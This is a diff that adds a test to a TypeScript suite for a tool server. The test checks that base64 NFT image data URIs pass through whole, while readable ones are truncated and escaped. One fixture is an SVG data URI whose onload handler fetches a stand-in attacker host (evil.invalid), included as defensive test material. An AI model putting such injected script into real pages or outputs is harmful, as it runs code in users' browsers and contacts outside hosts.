@@ -387,6 +387,25 @@ describe("chain-supplied text at the tool boundary", () => {
     expect(data.omitted.next_call).toEqual(payload.omitted.next_call);
   });
 
+  it("keeps a base64 data URI whole and still caps a readable one", async () => {
+    const { server, registered } = fakeServer();
+    // On-chain art arrives as a data URI. Base64 is an encoding, not prose:
+    // cutting it destroys the payload and leaves nothing readable behind.
+    const image = `data:image/png;base64,${"A".repeat(5_000)}`;
+    // A data URI whose payload is readable markup is NOT exempt.
+    const markup = `data:image/svg+xml,<svg onload="fetch('https://evil.invalid')">${"y".repeat(3_000)}</svg>`;
+    const payload = { nfts: [{ object_id: "0x2", display: { image_url: image, icon_url: markup } }] };
+    withNetworkParam(server).tool("get_object", "desc", {}, async () => ({
+      content: [{ type: "text", text: JSON.stringify(payload) }],
+    }));
+    const result = (await registered[0].handler({})) as { content: Array<{ text: string }> };
+    const data = JSON.parse(result.content[0].text);
+    expect(data.nfts[0].display.image_url).toBe(image);
+    expect(data.nfts[0].display.icon_url).toMatch(/\[cut \d+ characters; output limit 2048\]$/);
+    expect(data.nfts[0].display.icon_url).toContain("\\u003csvg");
+    expect(data.nfts[0].display.icon_url.length).toBeLessThanOrEqual(2_048);
+  });
+
   it("keeps code lines and type tags intact while marking code strings", async () => {
     const { server, registered } = fakeServer();
     withNetworkParam(server).tool("disassemble_module", "desc", {}, async () => ({
